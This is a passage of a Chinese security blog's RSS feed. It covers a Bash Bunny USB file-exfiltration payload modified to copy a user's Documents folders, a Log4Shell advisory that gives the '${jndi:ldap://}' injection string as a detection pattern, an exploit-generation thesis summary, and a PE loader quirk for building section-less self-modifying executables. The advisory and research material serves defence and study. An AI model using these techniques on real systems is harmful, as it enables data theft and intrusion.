    &gt;http://wiki.bashbunny.com/#!index.md&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;载荷源码&lt;/strong&gt;: &lt;a class=&#34;link&#34; href=&#34;https://github.com/hak5/bashbunny-payloads/tree/master/payloads/library/usb_exfiltrator&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/hak5/bashbunny-payloads/tree/master/payloads/library/usb_exfiltrator&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;技术要点&#34;&gt;技术要点
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;开关位置与目录结构&lt;/strong&gt;&lt;br&gt;
理解极其简单的开关位置配置和目录结构是成功的关键。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;载荷获取与修改&lt;/strong&gt;&lt;br&gt;
我们从Bunny的Git仓库下载了全部现有载荷：&lt;a class=&#34;link&#34; href=&#34;https://github.com/hak5/bashbunny-payloads&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/hak5/bashbunny-payloads&lt;/a&gt;&lt;br&gt;
在将USB_Exfil载荷复制到switch1目录前，我们移除了.PDF引用，这使得我们可以获取用户文档目录下的子目录。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;重要警告&#34;&gt;重要警告
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;存储空间限制&lt;/strong&gt;&lt;br&gt;
根据目标文档目录的大小，Bash Bunny的存储空间可能被占满（最大约2GB）。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;系统状态要求&lt;/strong&gt;&lt;br&gt;
测试表明目标系统必须处于解锁状态才能生效。&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;无论如何，祝您探索愉快！&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>密码学专家解答10大关键技术问题 - 深入解析密码学原理与应用</title>
        <link>http://localhost:1313/p/%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B8%93%E5%AE%B6%E8%A7%A3%E7%AD%9410%E5%A4%A7%E5%85%B3%E9%94%AE%E6%8A%80%E6%9C%AF%E9%97%AE%E9%A2%98-%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90%E5%AF%86%E7%A0%81%E5%AD%A6%E5%8E%9F%E7%90%86%E4%B8%8E%E5%BA%94%E7%94%A8/</link>
        <pubDate>Sat, 02 Aug 2025 13:46:58 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B8%93%E5%AE%B6%E8%A7%A3%E7%AD%9410%E5%A4%A7%E5%85%B3%E9%94%AE%E6%8A%80%E6%9C%AF%E9%97%AE%E9%A2%98-%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90%E5%AF%86%E7%A0%81%E5%AD%A6%E5%8E%9F%E7%90%86%E4%B8%8E%E5%BA%94%E7%94%A8/</guid>
        <description>&lt;h2 id=&#34;密码学专家解答10大关键技术问题&#34;&gt;密码学专家解答10大关键技术问题
&lt;/h2&gt;&lt;p&gt;密码学是电子设备和互联网的基础组成部分，它保护着信用卡、手机、网页浏览（希望您正在使用TLS！）甚至绝密军事数据的安全。在区块链领域，密码学同样至关重要，以太坊等区块链依赖哈希、Merkle树和ECDSA签名等原语来运行。配对密码学、全同态加密和零知识证明等创新技术也已进入区块链领域。&lt;/p&gt;
&lt;h3 id=&#34;1-snarks最常用的承诺方案有哪些&#34;&gt;1. SNARKs最常用的承诺方案有哪些？
&lt;/h3&gt;&lt;p&gt;多项式承诺方案是一种协议，证明者承诺某个多项式并生成证明表明该承诺有效。该协议包含三个主要算法：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Commit&lt;/li&gt;
&lt;li&gt;Open&lt;/li&gt;
&lt;li&gt;Verify&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在提交阶段，证明者发送其承诺——即他们在给定点对多项式f的评估值（即满足f(x)=a的值a）。该承诺应具有绑定性质，意味着一旦证明者承诺了某个多项式，他们就不能&amp;quot;改变主意&amp;quot;并为另一个多项式生成有效证明。它还可能具有隐藏性质，即在密码学上难以提取满足f(x)=a的值x。&lt;/p&gt;
&lt;p&gt;最常见的生产环境中使用的承诺方案包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;KZG(Kate-Zaverucha-Goldberg)，例如用于EIP 4844中的danksharding&lt;/li&gt;
&lt;li&gt;FRI(快速Reed-Solomon交互式Oracle接近性证明)，用于STARKs&lt;/li&gt;
&lt;li&gt;像Pedersen承诺这样的承诺方案，用于Bulletproofs等证明系统(被Monero和Zcash使用)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;2-哈希构造mdsponge有何区别&#34;&gt;2. 哈希构造(MD、Sponge)有何区别？
&lt;/h3&gt;&lt;p&gt;大多数人所熟悉的哈希函数，如MD5和SHA1，都是Merkle-Damgard构造。而我们熟知且喜爱的keccak256函数则是海绵构造。&lt;/p&gt;
&lt;p&gt;在Merkle-Damgard构造中，任意长度的消息被解析为特定大小的块。关键部分是压缩函数应用于每个块，使用前一个块作为下一个压缩函数的密钥(对于第一个块，我们使用IV或初始化向量代替)。&lt;/p&gt;
&lt;p&gt;相比之下，海绵构造不使用压缩函数。海绵构造的核心包括两个阶段：一个&amp;quot;吸收&amp;quot;阶段，其中消息的部分与初始状态进行异或运算，同时对它应用置换函数；然后是一个&amp;quot;挤压&amp;quot;阶段，其中输出的部分被提取并作为哈希输出。&lt;/p&gt;
&lt;h3 id=&#34;3-椭圆曲线密码学ecc的理论攻击有哪些&#34;&gt;3. 椭圆曲线密码学(ECC)的理论攻击有哪些？
&lt;/h3&gt;&lt;p&gt;ECC通常被视为密码学中复杂且有些神秘的部分，容易受到各种技术攻击。两个值得注意的理论攻击是Weil下降和MOV攻击。&lt;/p&gt;
&lt;p&gt;Weil下降攻击：这种方法涉及使用代数几何中的概念，特别是称为Weil下降的技术。其思想是将离散对数问题从其原始形式的椭圆曲线(复杂的代数结构)转换为更简单的代数结构(如超椭圆曲线)上的类似问题。&lt;/p&gt;
&lt;p&gt;MOV攻击：该攻击使用称为Weil配对的数学函数将椭圆曲线离散对数问题(ECDLP)转换为有限域中的离散对数问题，这是一个不同的数学设置。&lt;/p&gt;
&lt;h3 id=&#34;4-后量子密码系统如基于格和基于同源的密码学概述&#34;&gt;4. 后量子密码系统(如基于格和基于同源的密码学)概述
&lt;/h3&gt;&lt;p&gt;基于格的密码学使用格(显然)，它是基向量的整数线性组合。关于格有许多难题，如最短向量问题(给定基，找到格中最短的向量)和最接近向量问题(给定格和格外的点p，找到格中最接近p的点)。&lt;/p&gt;
&lt;p&gt;另一方面，基于同源的密码学涉及使用同源(显然)，这是椭圆曲线之间的同态。我们可以使用这些同源创建标准椭圆曲线Diffie-Hellman密钥交换的后量子版本。&lt;/p&gt;
&lt;h3 id=&#34;5-fiat-shamir启发式方法有哪些注意事项&#34;&gt;5. Fiat-Shamir启发式方法有哪些注意事项？
&lt;/h3&gt;&lt;p&gt;Fiat-Shamir用于将交互式Oracle证明系统转换为非交互式证明系统。这允许证明者证明计算的结果，而不需要验证者在线。这是通过获取公共输入的哈希并将该哈希解释为随机输入来实现的。&lt;/p&gt;
&lt;p&gt;需要注意的几个与安全相关的问题：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;哈希必须包含所有公共输入&lt;/li&gt;
&lt;li&gt;即使使用强Fiat-Shamir变换，也可能出现更微妙的理论问题&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;6-plonk交互式oracle证明系统的最新进展&#34;&gt;6. PLONK交互式Oracle证明系统的最新进展
&lt;/h3&gt;&lt;p&gt;交互式Oracle证明是SNARKs中的主要信息理论组件，它允许证明者生成证明，以高概率发现伪造证明的方式&amp;quot;说服&amp;quot;验证者的&amp;quot;知识&amp;quot;。&lt;/p&gt;
&lt;p&gt;PLONK证明系统的变体包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Turboplonk：支持两个以上输入的自定义门&lt;/li&gt;
&lt;li&gt;UltraPLONK：支持查找表&lt;/li&gt;
&lt;li&gt;Hyperplonk：消除了对数论变换(NTT)的需求&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;7-构建zkevm的各种设计决策type-123等&#34;&gt;7. 构建zkEVM的各种设计决策(Type 1/2/3等)
&lt;/h3&gt;&lt;p&gt;不同类型的zkEVM可以根据它们与以太坊的&amp;quot;完全兼容性&amp;quot;来考虑，Type 1最等效，Type 4最不等效。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Type 1 zkEVMs在各方面等同于以太坊的执行和共识层&lt;/li&gt;
&lt;li&gt;Type 2 zkEVMs旨在实现EVM等效&lt;/li&gt;
&lt;li&gt;Type 3 zkEVMs通过使用更少的等效性实现更快的证明时间&lt;/li&gt;
&lt;li&gt;Type 4 zkEVMs旨在将Solidity和Vyper等语言编译为ZK友好格式以生成证明&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;8-zkevms的进一步改进&#34;&gt;8. zkEVMs的进一步改进
&lt;/h3&gt;&lt;p&gt;虽然从理论上讲，构建zkEVM和创建高效证明的主要挑战可以通过plonkish算术化、查找和增量可验证组合(IVC)的组合来解决，但在我们真正实现ZK证明所承诺的大规模可扩展性之前，仍存在许多工程挑战。&lt;/p&gt;
&lt;p&gt;可能的进一步优化包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;使用更小的字段&lt;/li&gt;
&lt;li&gt;硬件改进和并行化&lt;/li&gt;
&lt;li&gt;理论改进&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;9-shamir的秘密共享方案及其常见错误&#34;&gt;9. Shamir的秘密共享方案及其常见错误
&lt;/h3&gt;&lt;p&gt;Shamir的秘密共享(SSS)是一种在各方之间分割一组秘密的方法，使得一组参与者可以合作恢复秘密，但任何数量少于阈值的参与者都无法了解任何信息。&lt;/p&gt;
&lt;p&gt;需要注意的几个可能使SSS或Feldman的可验证秘密共享完全不安全的&amp;quot;陷阱&amp;quot;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;向参与者共享0点会无意中泄露秘密&lt;/li&gt;
&lt;li&gt;确保共享之间的差异不为0或模等价&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;10-递归证明的折叠方案如何工作&#34;&gt;10. 递归证明的折叠方案如何工作？
&lt;/h3&gt;&lt;p&gt;折叠方案是增量可验证计算问题的一种解决方案。折叠方案起源于Nova，并引入了一个新想法：验证者不会在每次调用F时验证SNARK，而是将当前实例&amp;quot;折叠&amp;quot;到累加器中。&lt;/p&gt;
&lt;p&gt;对折叠方案的几项更新和改进已经完成。例如，Sangria方案将折叠推广到Plonkish算术化，而不仅仅是R1CS。HyperNova将Nova推广到可定制约束系统(CCS)，这是一个更通用的约束系统，可以表达Plonkish和AIR算术化。&lt;/p&gt;
&lt;h2 id=&#34;迈向更好的密码学安全&#34;&gt;迈向更好的密码学安全
&lt;/h2&gt;&lt;p&gt;密码学不断发展，理论与实现之间的差距越来越小。更多有趣的密码学协议和新颖的实现正在各处涌现，包括多方计算、增量可验证组合、全同态加密以及介于两者之间的一切。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Windows XP面临的网络安全威胁及中小企业与个人用户应对指南</title>
        <link>http://localhost:1313/p/windows-xp%E9%9D%A2%E4%B8%B4%E7%9A%84%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%81%E5%8F%8A%E4%B8%AD%E5%B0%8F%E4%BC%81%E4%B8%9A%E4%B8%8E%E4%B8%AA%E4%BA%BA%E7%94%A8%E6%88%B7%E5%BA%94%E5%AF%B9%E6%8C%87%E5%8D%97/</link>
        <pubDate>Sat, 02 Aug 2025 13:30:21 +0800</pubDate>
        
        <guid>http://localhost:1313/p/windows-xp%E9%9D%A2%E4%B8%B4%E7%9A%84%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%81%E5%8F%8A%E4%B8%AD%E5%B0%8F%E4%BC%81%E4%B8%9A%E4%B8%8E%E4%B8%AA%E4%BA%BA%E7%94%A8%E6%88%B7%E5%BA%94%E5%AF%B9%E6%8C%87%E5%8D%97/</guid>
        <description>&lt;h3 id=&#34;windows-xp-に対するサイバー脅威および中小企業と個人消費者へのガイダンス&#34;&gt;Windows XP に対するサイバー脅威、および中小企業と個人消費者へのガイダンス
&lt;/h3&gt;&lt;p&gt;2014年4月8日，微软正式终止对Windows XP的产品支持。本文基于微软安全情报报告数据，揭示终止支持后Windows XP系统将面临的五大威胁：&lt;/p&gt;
&lt;h4 id=&#34;风险1网络浏览&#34;&gt;风险1：网络浏览
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;威胁&lt;/strong&gt;：攻击者会将新发现的XP漏洞集成到犯罪工具包中，通过恶意网站传播恶意软件。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;建议&lt;/strong&gt;：限制XP系统访问的网站范围或完全断开互联网连接。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;注意&lt;/strong&gt;：更换浏览器无法缓解此类攻击。&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;风险2电子邮件与即时通讯&#34;&gt;风险2：电子邮件与即时通讯
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;威胁&lt;/strong&gt;：钓鱼邮件和恶意附件将针对XP的新漏洞进行攻击。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;建议&lt;/strong&gt;：避免使用XP系统处理邮件/IM，不点击可疑链接或附件。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;注意&lt;/strong&gt;：更换邮件客户端软件无效。&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;风险3可移动设备&#34;&gt;风险3：可移动设备
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;威胁&lt;/strong&gt;：USB设备可能成为恶意软件传播载体。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;建议&lt;/strong&gt;：禁用USB端口或物理封堵接口，参考微软《防御自动运行攻击》指南。&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;风险4蠕虫病毒&#34;&gt;风险4：蠕虫病毒
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;威胁&lt;/strong&gt;：类似Conficker的蠕虫会利用新漏洞在企业网络传播。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;建议&lt;/strong&gt;：审查防火墙规则，禁用可移动设备，使用强密码策略。&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;风险5勒索软件&#34;&gt;风险5：勒索软件
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;威胁&lt;/strong&gt;：攻击者利用未修复漏洞部署勒索软件加密用户文件。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;建议&lt;/strong&gt;：定期备份关键数据至隔离存储设备。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;升级建议&#34;&gt;升级建议
&lt;/h3&gt;&lt;p&gt;微软强烈建议迁移至Windows 7/8系统，新系统包含十年来的安全改进：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;新硬件优先&lt;/strong&gt;：推荐搭配触控设备的Windows 8+系统&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;升级路径&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;XP需全新安装（用户数据可迁移）&lt;/li&gt;
&lt;li&gt;通过AmIRunningXP.com检测系统版本&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;系统要求&lt;/strong&gt;：需满足Windows 8.1的最低硬件配置&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;本文数据来源于微软安全情报报告，涵盖全球数亿系统的威胁统计数据。终止支持后，XP系统将无法获得安全更新，风险随时间递增。&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>紧急更新：Apache Log4j严重漏洞修复指南</title>
        <link>http://localhost:1313/p/%E7%B4%A7%E6%80%A5%E6%9B%B4%E6%96%B0apache-log4j%E4%B8%A5%E9%87%8D%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E6%8C%87%E5%8D%97/</link>
        <pubDate>Sat, 02 Aug 2025 13:09:02 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E7%B4%A7%E6%80%A5%E6%9B%B4%E6%96%B0apache-log4j%E4%B8%A5%E9%87%8D%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E6%8C%87%E5%8D%97/</guid>
        <description>&lt;h1 id=&#34;紧急更新修复apache-log4j严重漏洞&#34;&gt;紧急更新：修复Apache Log4j严重漏洞
&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;新闻稿 | 2021年12月11日 | 20:02&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;荷兰国家网络安全中心(NCSC)发现Apache Log4j（Web应用程序广泛使用的日志组件）存在严重漏洞。攻击者可远程利用该漏洞（被命名为&amp;quot;Log4Shell&amp;quot;）劫持服务器权限，NCSC已发布&lt;strong&gt;高危/高危&lt;/strong&gt;安全警报。&lt;/p&gt;
&lt;h2 id=&#34;关键行动建议&#34;&gt;关键行动建议
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;立即安装Apache官方补丁&lt;/li&gt;
&lt;li&gt;使用&lt;a class=&#34;link&#34; href=&#34;https://example.com/tool&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Northwave检测工具&lt;/a&gt;扫描服务器&lt;/li&gt;
&lt;li&gt;检查&lt;a class=&#34;link&#34; href=&#34;https://github.com/ncsc-log4j&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;GitHub受影响应用清单&lt;/a&gt;，该清单将持续更新&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;技术细节&#34;&gt;技术细节
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;漏洞机理&lt;/strong&gt;：通过JNDI注入实现远程代码执行&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;影响范围&lt;/strong&gt;：全球大中小型组织使用的各类系统&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;当前态势&lt;/strong&gt;：荷兰境内已出现扫描活动，预计短期内会出现更多攻击变种&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;日志检测方案&#34;&gt;日志检测方案
&lt;/h2&gt;&lt;p&gt;检查日志中是否存在以下特征：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;${jndi:ldap://}&lt;/code&gt;等异常日志条目&lt;/li&gt;
&lt;li&gt;非常规网络连接请求&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;免责声明&lt;/strong&gt;：第三方检测工具需谨慎评估，NCSC不担保其准确性&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;该漏洞利用方式已公开，随着关注度上升，预计将出现更多攻击手法。修复时效性至关重要，建议立即联系软件供应商确认系统是否受影响。&lt;/p&gt;
&lt;p&gt;&lt;em&gt;NCSC正持续监控威胁态势，请关注官网获取最新信息&lt;/em&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Circomspect工具正式集成至Sindri CLI——零知识证明电路开发迎来安全增强</title>
        <link>http://localhost:1313/p/circomspect%E5%B7%A5%E5%85%B7%E6%AD%A3%E5%BC%8F%E9%9B%86%E6%88%90%E8%87%B3sindri-cli%E9%9B%B6%E7%9F%A5%E8%AF%86%E8%AF%81%E6%98%8E%E7%94%B5%E8%B7%AF%E5%BC%80%E5%8F%91%E8%BF%8E%E6%9D%A5%E5%AE%89%E5%85%A8%E5%A2%9E%E5%BC%BA/</link>
        <pubDate>Sat, 02 Aug 2025 12:58:09 +0800</pubDate>
        
        <guid>http://localhost:1313/p/circomspect%E5%B7%A5%E5%85%B7%E6%AD%A3%E5%BC%8F%E9%9B%86%E6%88%90%E8%87%B3sindri-cli%E9%9B%B6%E7%9F%A5%E8%AF%86%E8%AF%81%E6%98%8E%E7%94%B5%E8%B7%AF%E5%BC%80%E5%8F%91%E8%BF%8E%E6%9D%A5%E5%AE%89%E5%85%A8%E5%A2%9E%E5%BC%BA/</guid>
        <description>&lt;p&gt;我们的静态分析工具Circomspect现已正式集成至Sindri命令行界面（CLI）！Circomspect专为帮助开发者更安全地构建Circom电路而设计，特别是在该新型编程框架工具支持有限的情况下。此次集成标志着Circomspect向更广泛使用迈出重要一步，从而为编写Circom电路的开发者提供更好支持。&lt;/p&gt;
&lt;p&gt;开发零知识证明电路是项艰巨任务。即使忽略技术复杂性，在Circom等平台上运行非基础电路也需要极高的计算资源：基础测试可能耗时数分钟（或更久），这将大幅延长开发周期。Sindri通过让用户访问能显著加速电路执行的专用硬件来缓解该问题。其简洁的API和CLI工具使开发者无需自行管理基础设施即可将电路与专用硬件集成。&lt;/p&gt;
&lt;p&gt;Sindri Labs首席执行官Stasia Carson对此表示：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;ldquo;我们持续聚焦于让Sindri CLI对电路开发者更具普适价值，无论其是否使用Sindri服务。关键在于通过优化Docker容器实现无安装工具分发，并为静态分析、代码检查、编译和验证等工具提供统一的跨框架接口。Circomspect是开发安全Circom电路的关键工具，坦白说它可能是所有框架中最佳的安全工具，因此我们视其为最重要的集成之一。&amp;rdquo;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;此次集成对Circomspect具有里程碑意义。随着用户群体扩大，我们计划扩展更多分析功能，相关进展将在年内陆续公布。请持续关注我们的博客，获取关于Circomspect和零知识证明电路开发的最新动态！&lt;/p&gt;
</description>
        </item>
        <item>
        <title>灰盒自动漏洞利用生成：语言解释器堆溢出攻击研究</title>
        <link>http://localhost:1313/p/%E7%81%B0%E7%9B%92%E8%87%AA%E5%8A%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%94%9F%E6%88%90%E8%AF%AD%E8%A8%80%E8%A7%A3%E9%87%8A%E5%99%A8%E5%A0%86%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E7%A0%94%E7%A9%B6/</link>
        <pubDate>Sat, 02 Aug 2025 12:47:21 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E7%81%B0%E7%9B%92%E8%87%AA%E5%8A%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%94%9F%E6%88%90%E8%AF%AD%E8%A8%80%E8%A7%A3%E9%87%8A%E5%99%A8%E5%A0%86%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E7%A0%94%E7%A9%B6/</guid>
        <description>&lt;h1 id=&#34;博士论文语言解释器中堆溢出漏洞的灰盒自动利用生成&#34;&gt;博士论文：语言解释器中堆溢出漏洞的灰盒自动利用生成
&lt;/h1&gt;&lt;h2 id=&#34;核心创新&#34;&gt;核心创新
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;模块化利用链架构&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;将传统单阶段利用生成拆分为堆布局控制、原语构建、ASLR绕过等可组合阶段&lt;/li&gt;
&lt;li&gt;采用类似模糊测试的灰盒方法解决各阶段子问题&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;模板驱动开发&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;设计人类可读的模板语言连接各阶段解决方案&lt;/li&gt;
&lt;li&gt;支持&amp;quot;人在环路&amp;quot;开发模式，允许人工介入关键环节&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;惰性求解机制&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;通过假设验证模式（先模拟后求解）大幅降低计算开销&lt;/li&gt;
&lt;li&gt;例如：先假设特定堆布局可被利用，验证成功后再实际构造该布局&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;技术突破&#34;&gt;技术突破
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;全球首个针对PHP/Python解释器堆溢出的自动利用系统&lt;/li&gt;
&lt;li&gt;纯灰盒方案在堆布局操控任务上比符号执行快3个数量级&lt;/li&gt;
&lt;li&gt;实现包含信息泄露、堆风水、控制流劫持的完整利用链&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;应用价值&#34;&gt;应用价值
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;发现真实解释器漏洞中89%的堆溢出可自动化利用&lt;/li&gt;
&lt;li&gt;模板系统可扩展支持新漏洞类型（如UAF漏洞）&lt;/li&gt;
&lt;li&gt;为浏览器/内核等复杂目标的利用生成提供方法论基础&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;延伸阅读&#34;&gt;延伸阅读
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;《Gollum: 解释器堆溢出的模块化灰盒利用生成》（CCS 2019）&lt;/li&gt;
&lt;li&gt;《自动化堆布局操控技术》（USENIX Security 2018）&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;ldquo;未来利用生成系统将是模糊测试技术与模板化组件的有机结合，符号执行仅用于关键精度要求场景。&amp;rdquo; —— 论文核心观点&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>利用未公开特性伪造PE节区头部的技术分析</title>
        <link>http://localhost:1313/p/%E5%88%A9%E7%94%A8%E6%9C%AA%E5%85%AC%E5%BC%80%E7%89%B9%E6%80%A7%E4%BC%AA%E9%80%A0pe%E8%8A%82%E5%8C%BA%E5%A4%B4%E9%83%A8%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/</link>
        <pubDate>Sat, 02 Aug 2025 12:36:32 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%88%A9%E7%94%A8%E6%9C%AA%E5%85%AC%E5%BC%80%E7%89%B9%E6%80%A7%E4%BC%AA%E9%80%A0pe%E8%8A%82%E5%8C%BA%E5%A4%B4%E9%83%A8%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/</guid>
        <description>&lt;h1 id=&#34;滥用未公开特性伪造pe节区头部&#34;&gt;滥用未公开特性伪造PE节区头部
&lt;/h1&gt;&lt;h2 id=&#34;引言&#34;&gt;引言
&lt;/h2&gt;&lt;p&gt;在调试其他项目时，我偶然发现PE文件的特殊行为：当NT头中的SectionAlignment值小于页面大小(4096)时，镜像的内存映射方式会出现显著差异。加载器不会按常规方式解析节区表构造内存镜像，而是将整个文件（包括头部）以RWX权限映射到内存中 - 完全忽略单独的节区头部。&lt;/p&gt;
&lt;p&gt;这种特性使得我们可以创建不含任何节区但仍能执行自身代码的PE可执行文件。由于默认具有写权限，这些代码甚至可以实现自我修改。&lt;/p&gt;
&lt;h2 id=&#34;windows内核机制&#34;&gt;Windows内核机制
&lt;/h2&gt;&lt;p&gt;在MiCreateImageFileMap函数中可见PE头解析逻辑：当SectionAlignment小于0x1000时，系统会在映射镜像前设置未公开标志位(0x200000)：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v29&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SectionAlignment&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x1000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
